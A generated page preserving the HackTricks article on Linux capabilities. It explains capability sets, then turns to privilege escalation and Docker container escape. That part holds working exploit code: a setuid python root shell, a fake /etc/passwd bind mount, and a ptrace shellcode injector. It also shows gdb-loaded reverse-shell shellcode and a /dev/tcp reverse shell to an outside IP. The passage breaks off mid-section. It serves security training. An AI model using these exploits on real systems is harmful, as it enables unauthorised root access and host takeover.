---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Linux Capabilities

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-linux-hardening-privilege-escalation-linux-capabilities` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/linux-hardening/privilege-escalation/linux-capabilities.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Linux Capabilities](../../topics/linux-hardening/linux-capabilities.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-linux-hardening-privilege-escalation-linux-capabilities |
| name | Linux Capabilities |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/linux-hardening/privilege-escalation/linux-capabilities.md |

## Preserved Source Material

````yaml
_body: "# Linux Capabilities\n\n{{#include ../../banners/hacktricks-training.md}}\n\n\n## Linux Capabilities\n\nLinux capabilities\
  \ divide **root privileges into smaller, distinct units**, allowing processes to have a subset of privileges. This minimizes\
  \ the risks by not granting full root privileges unnecessarily.\n\n### The Problem:\n\n- Normal users have limited permissions,\
  \ affecting tasks like opening a network socket which requires root access.\n\n### Capability Sets:\n\n1. **Inherited (CapInh)**:\n\
  \n   - **Purpose**: Determines the capabilities passed down from the parent process.\n   - **Functionality**: When a new\
  \ process is created, it inherits the capabilities from its parent in this set. Useful for maintaining certain privileges\
  \ across process spawns.\n   - **Restrictions**: A process cannot gain capabilities that its parent did not possess.\n\n\
  2. **Effective (CapEff)**:\n\n   - **Purpose**: Represents the actual capabilities a process is utilizing at any moment.\n\
  \   - **Functionality**: It's the set of capabilities checked by the kernel to grant permission for various operations.\
  \ For files, this set can be a flag indicating if the file's permitted capabilities are to be considered effective.\n  \
  \ - **Significance**: The effective set is crucial for immediate privilege checks, acting as the active set of capabilities\
  \ a process can use.\n\n3. **Permitted (CapPrm)**:\n\n   - **Purpose**: Defines the maximum set of capabilities a process\
  \ can possess.\n   - **Functionality**: A process can elevate a capability from the permitted set to its effective set,\
  \ giving it the ability to use that capability. It can also drop capabilities from its permitted set.\n   - **Boundary**:\
  \ It acts as an upper limit for the capabilities a process can have, ensuring a process doesn't exceed its predefined privilege\
  \ scope.\n\n4. **Bounding (CapBnd)**:\n\n   - **Purpose**: Puts a ceiling on the capabilities a process can ever acquire\
  \ during its lifecycle.\n   - **Functionality**: Even if a process has a certain capability in its inheritable or permitted\
  \ set, it cannot acquire that capability unless it's also in the bounding set.\n   - **Use-case**: This set is particularly\
  \ useful for restricting a process's privilege escalation potential, adding an extra layer of security.\n\n5. **Ambient\
  \ (CapAmb)**:\n   - **Purpose**: Allows certain capabilities to be maintained across an `execve` system call, which typically\
  \ would result in a full reset of the process's capabilities.\n   - **Functionality**: Ensures that non-SUID programs that\
  \ don't have associated file capabilities can retain certain privileges.\n   - **Restrictions**: Capabilities in this set\
  \ are subject to the constraints of the inheritable and permitted sets, ensuring they don't exceed the process's allowed\
  \ privileges.\n\n```python\n# Code to demonstrate the interaction of different capability sets might look like this:\n#\
  \ Note: This is pseudo-code for illustrative purposes only.\ndef manage_capabilities(process):\n    if process.has_capability('cap_setpcap'):\n\
  \        process.add_capability_to_set('CapPrm', 'new_capability')\n    process.limit_capabilities('CapBnd')\n    process.preserve_capabilities_across_execve('CapAmb')\n\
  ```\n\nFor further information check:\n\n- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)\n\
  - [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)\n\
  \n## Processes & Binaries Capabilities\n\n### Processes Capabilities\n\nTo see the capabilities for a particular process,\
  \ use the **status** file in the /proc directory. As it provides more details, let’s limit it only to the information related\
  \ to Linux capabilities.\\\nNote that for all running processes capability information is maintained per thread, for binaries\
  \ in the file system it’s stored in extended attributes.\n\nYou can find the capabilities defined in /usr/include/linux/capability.h\n\
  \nYou can find the capabilities of the current process in `cat /proc/self/status` or doing `capsh --print` and of other\
  \ users in `/proc/<pid>/status`\n\n```bash\ncat /proc/1234/status | grep Cap\ncat /proc/$$/status | grep Cap #This will\
  \ print the capabilities of the current process\n```\n\nThis command should return 5 lines on most systems.\n\n- CapInh\
  \ = Inherited capabilities\n- CapPrm = Permitted capabilities\n- CapEff = Effective capabilities\n- CapBnd = Bounding set\n\
  - CapAmb = Ambient capabilities set\n\n```bash\n#These are the typical capabilities of a root owned process (all)\nCapInh:\
  \ 0000000000000000\nCapPrm: 0000003fffffffff\nCapEff: 0000003fffffffff\nCapBnd: 0000003fffffffff\nCapAmb: 0000000000000000\n\
  ```\n\nThese hexadecimal numbers don’t make sense. Using the capsh utility we can decode them into the capabilities name.\n\
  \n```bash\ncapsh --decode=0000003fffffffff\n0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37\n\
  ```\n\nLets check now the **capabilities** used by `ping`:\n\n```bash\ncat /proc/9491/status | grep Cap\nCapInh:    0000000000000000\n\
  CapPrm:    0000000000003000\nCapEff:    0000000000000000\nCapBnd:    0000003fffffffff\nCapAmb:    0000000000000000\n\ncapsh\
  \ --decode=0000000000003000\n0x0000000000003000=cap_net_admin,cap_net_raw\n```\n\nAlthough that works, there is another\
  \ and easier way. To see the capabilities of a running process, simply use the **getpcaps** tool followed by its process\
  \ ID (PID). You can also provide a list of process IDs.\n\n```bash\ngetpcaps 1234\n```\n\nLets check here the capabilities\
  \ of `tcpdump` after having giving the binary enough capabilities (`cap_net_admin` and `cap_net_raw`) to sniff the network\
  \ (_tcpdump is running in process 9562_):\n\n```bash\n#The following command give tcpdump the needed capabilities to sniff\
  \ traffic\n$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump\n\n$ getpcaps 9562\nCapabilities for `9562': = cap_net_admin,cap_net_raw+ep\n\
  \n$ cat /proc/9562/status | grep Cap\nCapInh:    0000000000000000\nCapPrm:    0000000000003000\nCapEff:    0000000000003000\n\
  CapBnd:    0000003fffffffff\nCapAmb:    0000000000000000\n\n$ capsh --decode=0000000000003000\n0x0000000000003000=cap_net_admin,cap_net_raw\n\
  ```\n\nAs you can see the given capabilities corresponds with the results of the 2 ways of getting the capabilities of a\
  \ binary.\\\nThe _getpcaps_ tool uses the **capget()** system call to query the available capabilities for a particular\
  \ thread. This system call only needs to provide the PID to obtain more information.\n\n### Binaries Capabilities\n\nBinaries\
  \ can have capabilities that can be used while executing. For example, it's very common to find `ping` binary with `cap_net_raw`\
  \ capability:\n\n```bash\ngetcap /usr/bin/ping\n/usr/bin/ping = cap_net_raw+ep\n```\n\nYou can **search binaries with capabilities**\
  \ using:\n\n```bash\ngetcap -r / 2>/dev/null\n```\n\n### Dropping capabilities with capsh\n\nIf we drop the CAP*NET_RAW\
  \ capabilities for \\_ping*, then the ping utility should no longer work.\n\n```bash\ncapsh --drop=cap_net_raw --print --\
  \ -c \"tcpdump\"\n```\n\nBesides the output of _capsh_ itself, the _tcpdump_ command itself should also raise an error.\n\
  \n> /bin/bash: /usr/sbin/tcpdump: Operation not permitted\n\nThe error clearly shows that the ping command is not allowed\
  \ to open an ICMP socket. Now we know for sure that this works as expected.\n\n### Remove Capabilities\n\nYou can remove\
  \ capabilities of a binary with\n\n```bash\nsetcap -r </path/to/binary>\n```\n\n## User Capabilities\n\nApparently **it's\
  \ possible to assign capabilities also to users**. This probably means that every process executed by the user will be able\
  \ to use the users capabilities.\\\nBase on on [this](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7),\
  \ [this ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)and [this ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)a\
  \ few files new to be configured to give a user certain capabilities but the one assigning the capabilities to each user\
  \ will be `/etc/security/capability.conf`.\\\nFile example:\n\n```bash\n# Simple\ncap_sys_ptrace               developer\n\
  cap_net_raw                  user1\n\n# Multiple capablities\ncap_net_admin,cap_net_raw    jrnetadmin\n# Identical, but\
  \ with numeric values\n12,13                        jrnetadmin\n\n# Combining names and numerics\ncap_sys_admin,22,25  \
  \        jrsysadmin\n```\n\n## Environment Capabilities\n\nCompiling the following program it's possible to **spawn a bash\
  \ shell inside an environment that provides capabilities**.\n\n```c:ambient.c\n/*\n * Test program for the ambient capabilities\n\
  \ *\n * compile using:\n * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c\n * Set effective, inherited and permitted\
  \ capabilities to the compiled binary\n * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient\n *\n\
  \ * To get a shell with additional caps that can be inherited do:\n *\n * ./ambient /bin/bash\n */\n\n#include <stdlib.h>\n\
  #include <stdio.h>\n#include <string.h>\n#include <errno.h>\n#include <sys/prctl.h>\n#include <linux/capability.h>\n#include\
  \ <cap-ng.h>\n\nstatic void set_ambient_cap(int cap) {\n  int rc;\n  capng_get_caps_process();\n  rc = capng_update(CAPNG_ADD,\
  \ CAPNG_INHERITABLE, cap);\n  if (rc) {\n    printf(\"Cannot add inheritable cap\\n\");\n    exit(2);\n  }\n  capng_apply(CAPNG_SELECT_CAPS);\n\
  \  /* Note the two 0s at the end. Kernel checks for these */\n  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0,\
  \ 0)) {\n    perror(\"Cannot set cap\");\n    exit(1);\n  }\n}\nvoid usage(const char * me) {\n  printf(\"Usage: %s [-c\
  \ caps] new-program new-args\\n\", me);\n  exit(1);\n}\nint default_caplist[] = {\n  CAP_NET_RAW,\n  CAP_NET_ADMIN,\n  CAP_SYS_NICE,\n\
  \  -1\n};\nint * get_caplist(const char * arg) {\n  int i = 1;\n  int * list = NULL;\n  char * dup = strdup(arg), * tok;\n\
  \  for (tok = strtok(dup, \",\"); tok; tok = strtok(NULL, \",\")) {\n    list = realloc(list, (i + 1) * sizeof(int));\n\
  \    if (!list) {\n      perror(\"out of memory\");\n      exit(1);\n    }\n    list[i - 1] = atoi(tok);\n    list[i] =\
  \ -1;\n    i++;\n  }\n  return list;\n}\nint main(int argc, char ** argv) {\n  int rc, i, gotcaps = 0;\n  int * caplist\
  \ = NULL;\n  int index = 1; // argv index for cmd to start\n  if (argc < 2)\n    usage(argv[0]);\n  if (strcmp(argv[1],\
  \ \"-c\") == 0) {\n    if (argc <= 3) {\n      usage(argv[0]);\n    }\n    caplist = get_caplist(argv[2]);\n    index =\
  \ 3;\n  }\n  if (!caplist) {\n    caplist = (int * ) default_caplist;\n  }\n  for (i = 0; caplist[i] != -1; i++) {\n   \
  \ printf(\"adding %d to ambient list\\n\", caplist[i]);\n    set_ambient_cap(caplist[i]);\n  }\n  printf(\"Ambient forking\
  \ shell\\n\");\n  if (execv(argv[index], argv + index))\n    perror(\"Cannot exec\");\n  return 0;\n}\n```\n\n```bash\n\
  gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c\nsudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip\
  \ ambient\n./ambient /bin/bash\n```\n\nInside the **bash executed by the compiled ambient binary** it's possible to observe\
  \ the **new capabilities** (a regular user won't have any capability in the \"current\" section).\n\n```bash\ncapsh --print\n\
  Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip\n```\n\n> [!CAUTION]\n> You can **only add capabilities that are present**\
  \ in both the permitted and the inheritable sets.\n\n### Capability-aware/Capability-dumb binaries\n\nThe **capability-aware\
  \ binaries won't use the new capabilities** given by the environment, however the **capability dumb binaries will us**e\
  \ them as they won't reject them. This makes capability-dumb binaries vulnerable inside a special environment that grant\
  \ capabilities to binaries.\n\n## Service Capabilities\n\nBy default a **service running as root will have assigned all\
  \ the capabilities**, and in some occasions this may be dangerous.\\\nTherefore, a **service configuration** file allows\
  \ to **specify** the **capabilities** you want it to have, **and** the **user** that should execute the service to avoid\
  \ running a service with unnecessary privileges:\n\n```bash\n[Service]\nUser=bob\nAmbientCapabilities=CAP_NET_BIND_SERVICE\n\
  ```\n\n## Capabilities in Docker Containers\n\nBy default Docker assigns a few capabilities to the containers. It's very\
  \ easy to check which capabilities are these by running:\n\n```bash\ndocker run --rm -it  r.j3ss.co/amicontained bash\n\
  Capabilities:\n\tBOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot\
  \ mknod audit_write setfcap\n\n# Add a capabilities\ndocker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash\n\
  \n# Add all capabilities\ndocker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash\n\n# Remove all and add only one\n\
  docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash\n```\n\n## Privesc/Container Escape\n\
  \nCapabilities are useful when you **want to restrict your own processes after performing privileged operations** (e.g.\
  \ after setting up chroot and binding to a socket). However, they can be exploited by passing them malicious commands or\
  \ arguments which are then run as root.\n\nYou can force capabilities upon programs using `setcap`, and query these using\
  \ `getcap`:\n\n```bash\n#Set Capability\nsetcap cap_net_raw+ep /sbin/ping\n\n#Get Capability\ngetcap /sbin/ping\n/sbin/ping\
  \ = cap_net_raw+ep\n```\n\nThe `+ep` means you’re adding the capability (“-” would remove it) as Effective and Permitted.\n\
  \nTo identify programs in a system or folder with capabilities:\n\n```bash\ngetcap -r / 2>/dev/null\n```\n\n### Exploitation\
  \ example\n\nIn the following example the binary `/usr/bin/python2.6` is found vulnerable to privesc:\n\n```bash\nsetcap\
  \ cap_setuid+ep /usr/bin/python2.7\n/usr/bin/python2.7 = cap_setuid+ep\n\n#Exploit\n/usr/bin/python2.7 -c 'import os; os.setuid(0);\
  \ os.system(\"/bin/bash\");'\n```\n\n**Capabilities** needed by `tcpdump` to **allow any user to sniff packets**:\n\n```bash\n\
  setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump\ngetcap /usr/sbin/tcpdump\n/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip\n\
  ```\n\n### The special case of \"empty\" capabilities\n\n[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html):\
  \ Note that one can assign empty capability sets to a program file, and thus it is possible to create a set-user-ID-root\
  \ program that changes the effective and saved set-user-ID of the process that executes the program to 0, but confers no\
  \ capabilities to that process. Or, simply put, if you have a binary that:\n\n1. is not owned by root\n2. has no `SUID`/`SGID`\
  \ bits set\n3. has empty capabilities set (e.g.: `getcap myelf` returns `myelf =ep`)\n\nthen **that binary will run as root**.\n\
  \n## CAP_SYS_ADMIN\n\n**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** is a highly potent\
  \ Linux capability, often equated to a near-root level due to its extensive **administrative privileges**, such as mounting\
  \ devices or manipulating kernel features. While indispensable for containers simulating entire systems, **`CAP_SYS_ADMIN`\
  \ poses significant security challenges**, especially in containerized environments, due to its potential for privilege\
  \ escalation and system compromise. Therefore, its usage warrants stringent security assessments and cautious management,\
  \ with a strong preference for dropping this capability in application-specific containers to adhere to the **principle\
  \ of least privilege** and minimize the attack surface.\n\n**Example with binary**\n\n```bash\ngetcap -r / 2>/dev/null\n\
  /usr/bin/python2.7 = cap_sys_admin+ep\n```\n\nUsing python you can mount a modified _passwd_ file on top of the real _passwd_\
  \ file:\n\n```bash\ncp /etc/passwd ./ #Create a copy of the passwd file\nopenssl passwd -1 -salt abc password #Get hash\
  \ of \"password\"\nvim ./passwd #Change roots passwords of the fake passwd file\n```\n\nAnd finally **mount** the modified\
  \ `passwd` file on `/etc/passwd`:\n\n```python\nfrom ctypes import *\nlibc = CDLL(\"libc.so.6\")\nlibc.mount.argtypes =\
  \ (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)\nMS_BIND = 4096\nsource = b\"/path/to/fake/passwd\"\ntarget = b\"/etc/passwd\"\
  \nfilesystemtype = b\"none\"\noptions = b\"rw\"\nmountflags = MS_BIND\nlibc.mount(source, target, filesystemtype, mountflags,\
  \ options)\n```\n\nAnd you will be able to **`su` as root** using password \"password\".\n\n**Example with environment (Docker\
  \ breakout)**\n\nYou can check the enabled capabilities inside the docker container using:\n\n```\ncapsh --print\nCurrent:\
  \ = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep\n\
  Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read\n\
  Securebits: 00/0x0/1'b0\n secure-noroot: no (unlocked)\n secure-no-suid-fixup: no (unlocked)\n secure-keep-caps: no (unlocked)\n\
  uid=0(root)\ngid=0(root)\ngroups=0(root)\n```\n\nInside the previous output you can see that the SYS_ADMIN capability is\
  \ enabled.\n\n- **Mount**\n\nThis allows the docker container to **mount the host disk and access it freely**:\n\n```bash\n\
  fdisk -l #Get disk name\nDisk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors\nUnits: sectors of 1 * 512 = 512 bytes\n\
  Sector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\n\nmount /dev/sda\
  \ /mnt/ #Mount it\ncd /mnt\nchroot ./ bash #You have a shell inside the docker hosts disk\n```\n\n- **Full access**\n\n\
  In the previous method we managed to access the docker host disk.\\\nIn case you find that the host is running an **ssh**\
  \ server, you could **create a user inside the docker host** disk and access it via SSH:\n\n```bash\n#Like in the example\
  \ before, the first step is to mount the docker host disk\nfdisk -l\nmount /dev/sda /mnt/\n\n#Then, search for open ports\
  \ inside the docker host\nnc -v -n -w2 -z 172.17.0.1 1-65535\n(UNKNOWN) [172.17.0.1] 2222 (?) open\n\n#Finally, create a\
  \ new user inside the docker host and use it to access via SSH\nchroot /mnt/ adduser john\nssh john@172.17.0.1 -p 2222\n\
  ```\n\n## CAP_SYS_PTRACE\n\n**This means that you can escape the container by injecting a shellcode inside some process\
  \ running inside the host.** To access processes running inside the host the container needs to be run at least with **`--pid=host`**.\n\
  \n**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** grants the ability to use debugging\
  \ and system call tracing functionalities provided by `ptrace(2)` and cross-memory attach calls like `process_vm_readv(2)`\
  \ and `process_vm_writev(2)`. Although powerful for diagnostic and monitoring purposes, if `CAP_SYS_PTRACE` is enabled without\
  \ restrictive measures like a seccomp filter on `ptrace(2)`, it can significantly undermine system security. Specifically,\
  \ it can be exploited to circumvent other security restrictions, notably those imposed by seccomp, as demonstrated by [proofs\
  \ of concept (PoC) like this one](https://gist.github.com/thejh/8346f47e359adecd1d53).\n\n**Example with binary (python)**\n\
  \n```bash\ngetcap -r / 2>/dev/null\n/usr/bin/python2.7 = cap_sys_ptrace+ep\n```\n\n```python\nimport ctypes\nimport sys\n\
  import struct\n# Macros defined in <sys/ptrace.h>\n# https://code.woboq.org/qt5/include/sys/ptrace.h.html\nPTRACE_POKETEXT\
  \ = 4\nPTRACE_GETREGS = 12\nPTRACE_SETREGS = 13\nPTRACE_ATTACH = 16\nPTRACE_DETACH = 17\n# Structure defined in <sys/user.h>\n\
  # https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct\nclass user_regs_struct(ctypes.Structure):\n    _fields_\
  \ = [\n        (\"r15\", ctypes.c_ulonglong),\n        (\"r14\", ctypes.c_ulonglong),\n        (\"r13\", ctypes.c_ulonglong),\n\
  \        (\"r12\", ctypes.c_ulonglong),\n        (\"rbp\", ctypes.c_ulonglong),\n        (\"rbx\", ctypes.c_ulonglong),\n\
  \        (\"r11\", ctypes.c_ulonglong),\n        (\"r10\", ctypes.c_ulonglong),\n        (\"r9\", ctypes.c_ulonglong),\n\
  \        (\"r8\", ctypes.c_ulonglong),\n        (\"rax\", ctypes.c_ulonglong),\n        (\"rcx\", ctypes.c_ulonglong),\n\
  \        (\"rdx\", ctypes.c_ulonglong),\n        (\"rsi\", ctypes.c_ulonglong),\n        (\"rdi\", ctypes.c_ulonglong),\n\
  \        (\"orig_rax\", ctypes.c_ulonglong),\n        (\"rip\", ctypes.c_ulonglong),\n        (\"cs\", ctypes.c_ulonglong),\n\
  \        (\"eflags\", ctypes.c_ulonglong),\n        (\"rsp\", ctypes.c_ulonglong),\n        (\"ss\", ctypes.c_ulonglong),\n\
  \        (\"fs_base\", ctypes.c_ulonglong),\n        (\"gs_base\", ctypes.c_ulonglong),\n        (\"ds\", ctypes.c_ulonglong),\n\
  \        (\"es\", ctypes.c_ulonglong),\n        (\"fs\", ctypes.c_ulonglong),\n        (\"gs\", ctypes.c_ulonglong),\n \
  \   ]\n\nlibc = ctypes.CDLL(\"libc.so.6\")\n\npid=int(sys.argv[1])\n\n# Define argument type and respone type.\nlibc.ptrace.argtypes\
  \ = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]\nlibc.ptrace.restype = ctypes.c_uint64\n\n# Attach\
  \ to the process\nlibc.ptrace(PTRACE_ATTACH, pid, None, None)\nregisters=user_regs_struct()\n\n# Retrieve the value stored\
  \ in registers\nlibc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))\nprint(\"Instruction Pointer: \" + hex(registers.rip))\n\
  print(\"Injecting Shellcode at: \" + hex(registers.rip))\n\n# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c\n\
  shellcode = \"\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\x31\\xf6\\xff\\xc6\\x6a\\x29\\x58\\x6a\\x02\\x5f\\x0f\\x05\\x48\\x97\\\
  x6a\\x02\\x66\\xc7\\x44\\x24\\x02\\x15\\xe0\\x54\\x5e\\x52\\x6a\\x31\\x58\\x6a\\x10\\x5a\\x0f\\x05\\x5e\\x6a\\x32\\x58\\\
  x0f\\x05\\x6a\\x2b\\x58\\x0f\\x05\\x48\\x97\\x6a\\x03\\x5e\\xff\\xce\\xb0\\x21\\x0f\\x05\\x75\\xf8\\xf7\\xe6\\x52\\x48\\\
  xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x8d\\x3c\\x24\\xb0\\x3b\\x0f\\x05\"\n\n# Inject the shellcode into\
  \ the running process byte by byte.\nfor i in xrange(0,len(shellcode),4):\n    # Convert the byte to little endian.\n  \
  \  shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)\n    shellcode_byte_little_endian=struct.pack(\"<I\", shellcode_byte_int).rstrip('\\\
  x00').encode('hex')\n    shellcode_byte=int(shellcode_byte_little_endian,16)\n\n    # Inject the byte.\n    libc.ptrace(PTRACE_POKETEXT,\
  \ pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)\n\nprint(\"Shellcode Injected!!\")\n\n# Modify the instuction pointer\n\
  registers.rip=registers.rip+2\n\n# Set the registers\nlibc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))\n\
  print(\"Final Instruction Pointer: \" + hex(registers.rip))\n\n# Detach from the process.\nlibc.ptrace(PTRACE_DETACH, pid,\
  \ None, None)\n```\n\n**Example with binary (gdb)**\n\n`gdb` with `ptrace` capability:\n\n```\n/usr/bin/gdb = cap_sys_ptrace+ep\n\
  ```\n\nCreate a shellcode with msfvenom to inject in memory via gdb\n\n```python\n# msfvenom -p linux/x64/shell_reverse_tcp\
  \ LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py\nbuf =  b\"\"\nbuf += b\"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\\
  x01\\x5e\\x0f\\x05\"\nbuf += b\"\\x48\\x97\\x48\\xb9\\x02\\x00\\x23\\x29\\x0a\\x0a\\x0e\\x0b\"\nbuf += b\"\\x51\\x48\\x89\\\
  xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\"\nbuf += b\"\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\"\n\
  buf += b\"\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\"\nbuf += b\"\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\\
  x52\\x57\\x48\\x89\\xe6\"\nbuf += b\"\\x0f\\x05\"\n\n# Divisible by 8\npayload = b\"\\x90\" * (-len(buf) % 8) + buf\n\n\
  # Change endianess and print gdb lines to load the shellcode in RIP directly\nfor i in range(0, len(buf), 8):\n\tchunk =\
  \ payload[i:i+8][::-1]\n\tchunks = \"0x\"\n\tfor byte in chunk:\n\t\tchunks += f\"{byte:02x}\"\n\n\tprint(f\"set {{long}}($rip+{i})\
  \ = {chunks}\")\n```\n\nDebug a root process with gdb ad copy-paste the previously generated gdb lines:\n\n```bash\n# Let's\
  \ write the commands to a file\necho 'set {long}($rip+0) = 0x296a909090909090\nset {long}($rip+8) = 0x5e016a5f026a9958\n\
  set {long}($rip+16) = 0x0002b9489748050f\nset {long}($rip+24) = 0x48510b0e0a0a2923\nset {long}($rip+32) = 0x582a6a5a106ae689\n\
  set {long}($rip+40) = 0xceff485e036a050f\nset {long}($rip+48) = 0x6af675050f58216a\nset {long}($rip+56) = 0x69622fbb4899583b\n\
  set {long}($rip+64) = 0x8948530068732f6e\nset {long}($rip+72) = 0x050fe689485752e7\nc' > commands.gdb\n# In this case there\
  \ was a sleep run by root\n## NOTE that the process you abuse will die after the shellcode\n/usr/bin/gdb -p $(pgrep sleep)\n\
  [...]\n(gdb) source commands.gdb\nContinuing.\nprocess 207009 is executing new program: /usr/bin/dash\n[...]\n```\n\n**Example\
  \ with environment (Docker breakout) - Another gdb Abuse**\n\nIf **GDB** is installed (or you can install it with `apk add\
  \ gdb` or `apt install gdb` for example) you can **debug a process from the host** and make it call the `system` function.\
  \ (This technique also requires the capability `SYS_ADMIN`)**.**\n\n```bash\ngdb -p 1234\n(gdb) call (void)system(\"ls\"\
  )\n(gdb) call (void)system(\"sleep 5\")\n(gdb) call (void)system(\"bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'\"\
  )\n```\n\nYou won’t be able to see the output of the command executed but it will be executed by that process (so get a\
  \ rev shell).\n\n> [!WARNING]\n> If you get the error \"No symbol \"system\" in current context.\" check the previous example\
  \ loading a shellcode in a program via gdb.\n\n**Example with environment (Docker breakout) - Shellcode Injection**\n\n\
  You can check the enabled capabilities inside the docker container using:\n\n```bash\ncapsh --print\nCurrent: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep\n\
  Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap\n\
  Securebits: 00/0x0/1'b0\n secure-noroot: no (unlocked)\n secure-no-suid-fixup: no (unlocked)\n secure-keep-caps: no (unlocked)\n\
  uid=0(root)\ngid=0(root)\ngroups=0(root\n```\n\nList **processes** running in the **host** `ps -eaf`\n\n1. Get the **architecture**\
  \ `uname -m`\n2. Find a **shellcode** for the architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))\n\
  3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))\n\
  4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`\n5. **Inject** it and grab\
  \ your **shell**: `./inject 299; nc 172.17.0.1 5600`\n\n## CAP_SYS_MODULE\n\n**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**\
  \ empowers a process to **load and unload kernel modules (`init_module(2)`, `finit_module(2)` and `delete_module(2)` system\
